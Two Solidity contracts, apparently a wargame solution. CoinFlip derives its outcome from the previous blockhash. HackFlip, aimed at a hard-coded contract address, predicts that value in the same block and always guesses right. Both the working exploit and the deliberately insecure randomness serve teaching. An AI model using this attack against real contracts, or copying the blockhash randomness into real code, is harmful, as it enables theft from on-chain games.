pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT

import "./CoinFlip.sol";

contract HackFlip {

  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  CoinFlip mainContract;

  constructor() {
    mainContract = CoinFlip(0x15BdAd376EDa73F18CFf432887769aEc5AaDf59C);
  }

  function hackFlip() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    mainContract.flip(side);

  }
}

pragma solidity ^0.8.0;
// SPDX-License-Identifier: MIT

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}